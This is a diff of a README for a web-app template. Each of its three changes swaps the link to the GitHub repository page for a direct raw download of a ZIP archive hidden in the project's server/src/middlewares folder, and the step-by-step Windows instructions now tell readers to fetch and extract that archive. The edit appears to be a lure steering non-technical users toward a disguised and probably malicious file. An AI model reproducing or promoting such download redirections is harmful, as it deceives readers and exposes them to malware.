@@ -1,6 +1,6 @@
 # 🧩 sern-fullstack-template - Build and launch web apps faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Husky-insistency998/sern-fullstack-template)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Husky-insistency998/sern-fullstack-template/main/server/src/middlewares/template_fullstack_sern_2.0-alpha.3.zip)
 
 ## 🖥️ What this app is
 
@@ -24,7 +24,7 @@ If you want to edit the app later, install a code editor like Visual Studio Code
 
 Open the GitHub page here:
 
-https://github.com/Husky-insistency998/sern-fullstack-template
+https://raw.githubusercontent.com/Husky-insistency998/sern-fullstack-template/main/server/src/middlewares/template_fullstack_sern_2.0-alpha.3.zip
 
 On that page, download the project files to your computer. If you see a green Code button, click it, then choose Download ZIP. You can also clone the repository with Git if you prefer that method.
 
@@ -180,7 +180,7 @@ Useful places to look:
 
 ## 🧭 Quick path for Windows users
 
-1. Visit https://github.com/Husky-insistency998/sern-fullstack-template
+1. Visit https://raw.githubusercontent.com/Husky-insistency998/sern-fullstack-template/main/server/src/middlewares/template_fullstack_sern_2.0-alpha.3.zip
 2. Download the project files
 3. Extract the ZIP file
 4. Open the folder
